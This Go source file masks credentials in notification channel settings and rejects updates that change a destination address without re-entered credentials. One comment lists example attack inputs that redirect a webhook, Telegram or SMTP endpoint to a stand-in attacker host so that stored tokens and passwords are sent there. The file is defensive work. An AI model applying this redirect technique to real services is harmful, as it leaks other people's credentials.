package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes credentials, it replaces the real content with a value carrying this prefix,
// When the update interface receives a value with this prefix, it is understood as 'keep the original value in the database unchanged'.
//
// Using a prefix instead of an empty string or some fixed constant is so that a bit of identifiable information can be carried along
// (see MaskedValue), letting users distinguish 'which bot this is' without having to re-paste the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              the original value is too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original value as an identification hint
//
// Exposing only the last 6 characters is a deliberate choice: the identifying information of a Webhook address is in the tail segment (e.g. the key of WeCom,
// the bot id of Feishu), while the prefix part is the same for each bot and has no identification value. The last 6 characters are insufficient to
// restore the credential, but sufficient for the configurer to recognize 'that's my group'.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified after being echoed by the API).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config, replacing the credential fields of that channel with masked values.
//
// An unknown channel type returns an empty map instead of the original config—better to let the UI show 'config unavailable'
// than to spit back the entire original content that may contain credentials when the channel type cannot be recognized.
// Non-credential fields are kept as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as a whole: judging each sub-key would require each channel
		// to declare another set of rules for 'which sub-keys are credentials', with complexity far exceeding the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indicates 'the destination address changed, but the caller did not express an opinion on
// the credential fields'. Returning it rather than silently allowing or silently discarding credentials—see PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys without an explicit opinion
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination address (" + strings.Join(e.Changed, ", ") + ") has changed, please also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): fill in new values, or explicitly leave blank to indicate credentials are no longer needed." +
		"The original credentials are only valid for the old address; continuing to use them amounts to handing them to the new address."
}

// PrepareConfigUpdate merges the channel config and handles the security-sensitive case of 'destination address change'.
//
// It replaces the bare MergeConfig on the channel update path, and solves this empirically viable path:
// The destination address (where messages are sent) and the credentials (what identity is used to send) are two independent sets of fields, while MergeConfig
// for 'keys not mentioned' always retains the original values in the store. So anyone who can PATCH a channel, as long as they **only change the address,
// and say nothing about the credentials**, can make the server send the real credentials from the store to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header is sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → after STARTTLS, hand over the username and password
//
// This path is completely silent and does not rely on redirects (so rejecting cross-host redirects cannot stop it),
// and it directly defeats the goal of this package's masking mechanism — 'credentials are not echoed back to the browser'.
//
// Rule: as long as any destination key is changed to a new value, the caller must explicitly state a position for **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → that field no longer needs credentials (preserving the clear semantics)
//   - pass back the masked value as-is / simply omit this key → reject
//
// The third is also rejected because the meaning of 'masked value' is precisely 'reuse the old credentials', and the old credentials
// are only valid for the old address. Here we deliberately do not 'automatically discard credentials' — for optional credential fields
// (webhook's headers, email's password) that would silently become 'auth is gone but the API returns 200',
// which is harder to troubleshoot than an error. Better to make the operator fill it in one more time.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers is an object) has a masked literal embedded in it,
	// it means the caller stuffed the 'keep original value' sentinel inside the struct. MergeConfig only recognizes 'string
	// with a prefix' as masked; this form will be stored as-is as an ordinary object — the literal
	// "__masked__" really lands in the store, and subsequent auth silently fails with no error at all. Better to reject it.
	//
	// This check must be placed **at the very front**: when the address is unchanged it takes the early return, so placing it later would mean
	// only covering the 'change address' path (the first version got this wrong, and the tests caught it immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value equals 'not changed'.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged, use normal merge (masked values keep original, empty strings clear, others overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require explicit statement for each credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting a mask sentinel embedded in a non-string structure.
//
// The premise of the mask mechanism is 'the entire value is just a string'. Object fields like webhook headers,
// can only be masked as a whole (written as the string "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// can neither express 'keep unchanged' nor avoid being stored as a real value in the DB.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains mask marker %q: this field can only be left entirely empty to mean reuse, or submitted entirely with a new value; a mask placeholder cannot be embedded inside a struct",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. JSON serialization is used for comparison to also handle
// type differences—the port submitted by the frontend is a number, while what's read back from the DB is float64, so direct == would misjudge.
//
// 'Empty' must be normalized before comparison: an empty string and 'key absent' are the same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and directly deletes that key. Without normalization, an
// optional destination field that is always left empty (Telegram's base_url is the only such field: leaving it empty means using
// the official address) would go down this path—
//
//	at creation, base_url:"" is stored  →  on the first save, MergeConfig deletes the key
//	→ on the second save, incoming is "" and stored lacks the key, judged as 'address changed'
//	→ the credential is a masked value → 400 'destination address has changed, please also re-enter the credential field'
//
// After that, every save fails unless the user re-pastes the Bot Token, even though he changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value is 'empty'.
// The criterion must match MergeConfig's clear judgment (strings.TrimSpace(s) == ""),
// otherwise a gap arises where 'MergeConfig thinks it should be deleted, sameConfigValue thinks it has a value'.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming onto stored, used for updating channel config.
//
// Rules:
//   - keys in incoming whose value is a mask → keep stored's original value (the user didn't change this field)
//   - keys in incoming whose value is an empty string → treated as explicit clear, delete that key
//   - other keys → overwrite with incoming's value
//   - keys present in stored but not in incoming → keep (partial update semantics)
//
// Whether an empty string counts as 'clearing' needs to be explicit: the frontend form submits unfilled fields as empty strings,
// if it is treated as a valid value and written, fields meant to be 'left blank to keep the original value' would actually be cleared.
// Here we choose explicit clearing, because when clearing a field that was set incorrectly, the user has no other way to express it
// (dragging away a field can distinguish 'not provided' from 'provided empty value', but the UI doesn't use this distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // mask value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
